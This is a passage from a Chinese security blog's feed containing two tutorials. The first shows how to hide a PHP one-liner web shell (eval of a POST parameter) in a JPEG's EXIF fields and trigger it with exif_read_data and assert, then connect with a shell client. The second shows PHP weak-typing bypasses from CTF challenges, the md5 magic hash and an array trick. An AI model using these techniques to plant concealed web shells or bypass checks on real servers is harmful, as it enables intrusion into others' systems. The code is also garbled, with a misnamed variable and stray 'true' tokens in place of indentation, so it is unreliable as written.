class="number">19</span>)</span><br><span class="line"><span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span></span><br><span class="line">    <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">    <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">    <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">    <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">    <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line"><span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br></pre></td></tr></table></figure><p></p>
<h2 id="0x01__u7325_u7410_u5229_u7528"><a href="#0x01__u7325_u7410_u5229_u7528" class="headerlink" title="0x01 猥琐利用"></a>0x01 猥琐利用</h2><p></p><h4>右键点击图片，属性-》详细信息-》标记-》填写shell;<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">  <span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449825529</span></span><br><span class="line">  <span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line">  <span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line">  <span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF, WINXP'</span> (length=<span class="number">26</span>)</span><br><span class="line">  <span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span></span><br><span class="line">      <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">      <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">      <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">      <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">      <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br><span class="line">  <span class="string">'Keywords'</span> =&gt; string <span class="string">'shell'</span> (length=<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p></p>
<p></p><h4>可见下最下面多了一条’Keywords’ =&gt; string ‘shell’ (length=5)<p></p>
<p></p><h4>下面构造一句话,右键点击图片，属性-》详细信息-》标记-》填写<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable">$_POST[</span><span class="string">'x'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure><p></p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$exif</span>=exif_read_data(<span class="string">'11.jpg'</span>);</span><br><span class="line">var_dump(<span class="variable">$exif</span>);</span><br><span class="line">assert(<span class="variable">$exit</span>[<span class="string">'Keywords'</span>]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p></p><h4>菜刀连之，即可,<p></p>
<h2 id="0x02_u603B_u7ED3"><a href="#0x02_u603B_u7ED3" class="headerlink" title="0x02总结"></a>0x02总结</h2><p></p><h4>同样你把一句话不写在标记里面，写在主题，标题，作者等都是一样的。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">  <span class="string">'FileName'</span> =&gt; string <span class="string">'11.jpg'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'FileDateTime'</span> =&gt; <span class="keyword">int</span> <span class="number">1449827712</span></span><br><span class="line">  <span class="string">'FileSize'</span> =&gt; <span class="keyword">int</span> <span class="number">96252</span></span><br><span class="line">  <span class="string">'FileType'</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="string">'MimeType'</span> =&gt; string <span class="string">'image/jpeg'</span> (length=<span class="number">10</span>)</span><br><span class="line">  <span class="string">'SectionsFound'</span> =&gt; string <span class="string">'ANY_TAG, IFD0, EXIF, WINXP'</span> (length=<span class="number">26</span>)</span><br><span class="line">  <span class="string">'COMPUTED'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span></span><br><span class="line">      <span class="string">'html'</span> =&gt; string <span class="string">'width="600" height="800"'</span> (length=<span class="number">24</span>)</span><br><span class="line">      <span class="string">'Height'</span> =&gt; <span class="keyword">int</span> <span class="number">800</span></span><br><span class="line">      <span class="string">'Width'</span> =&gt; <span class="keyword">int</span> <span class="number">600</span></span><br><span class="line">      <span class="string">'IsColor'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">      <span class="string">'ByteOrderMotorola'</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">'ImageDescription'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br><span class="line">  <span class="string">'Artist'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Exif_IFD_Pointer'</span> =&gt; <span class="keyword">int</span> <span class="number">2110</span></span><br><span class="line">  <span class="string">'Title'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br><span class="line">  <span class="string">'Author'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Keywords'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">'])'</span> (length=<span class="number">17</span>)</span><br><span class="line">  <span class="string">'Subject'</span> =&gt; string <span class="string">'eval($_POST['</span>x<span class="string">']);'</span> (length=<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p></p>
<pre><code>Author:FreeV
</code></pre></h4></h4></h4></h4></h4></h4></h4></h4></h4>]]></content>
    <summary type="html">
    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x0]]>
    </summary>
    
      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php弱类型安全]]></title>
    <link href="http://yoursite.com/2015/12/09/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2015/12/09/php弱类型安全/</id>
    <published>2015-12-09T04:51:21.000Z</published>
    <updated>2016-04-21T13:22:34.981Z</updated>
    <content type="html"><![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"></a>0x00 理解php弱类型</h2><p></p><h4>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型<p></p>
<p></p><h4>例如php 中的当php中使用‘==’时会自动类型转换<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.php</span><br><span class="line">&lt;?php </span><br><span class="line">true<span class="variable">$b</span>=<span class="string">'1asd'</span>;</span><br><span class="line">true<span class="keyword">if</span> (<span class="number">1</span>==<span class="variable">$b</span>)</span><br><span class="line">truetrueecho <span class="string">"yes"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p>
<p></p><h4>如下代码都是我在ctf中遇到的题型<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">2</span>.php</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">true<span class="variable">$test</span>=$_GET[<span class="string">'test'</span>]; //test=<span class="number">240610708</span></span><br><span class="line">trueecho <span class="variable">$test</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">true<span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line">true<span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123;   //0exxx=<span class="number">0</span>  <span class="number">240610708</span></span><br><span class="line">truetrueecho <span class="string">"flag&#123;xxxxxx&#125;"</span>;</span><br><span class="line">true&#125;<span class="keyword">else</span> </span><br><span class="line">truetrueecho <span class="string">"you are falied!"</span>;</span><br><span class="line">trueecho  <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p></p>
<p></p><h4>test=240610708 就可以绕过了，因为240610708的md5是0e…..php自动类型转换时候就是0<p></p>
<h2 id="0x01_u7325_u7410_u5229_u7528"><a href="#0x01_u7325_u7410_u5229_u7528" class="headerlink" title="0x01猥琐利用"></a>0x01猥琐利用</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3.php</span><br><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span> </span><br><span class="line">true<span class="variable">$flag</span>=<span class="string">'xx'</span>;</span><br><span class="line">true<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line">truetrue<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'a'</span>] != <span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line">    	<span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">        	<span class="keyword">echo</span> (<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">truetrue<span class="keyword">else</span></span><br><span class="line">truetruetrue<span class="keyword">echo</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">truetrue&#125;</span><br><span class="line"> <span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p></p><h4>这道题与2.php的区别就是’==’换成了’===’<p></p>
<p></p><h4>提交a[]=1&amp;&amp;b[]=2,因为cmd5(a[])会报错，‘===’两边同时报错，也就是false===false弹出flag<p></p>
<pre><code>Author:FreeV
</code></pre></h4></h4></h4></h4></h4></h4>]]></content>
    <summary type="html">
    <![CDATA[<p>本文总阅读量<span id="busuanzi_value_page_pv"></span>次</p>
<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31]]>
    </summary>
    
      <category term="php代码安全" scheme="http://yoursite.com/tags/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
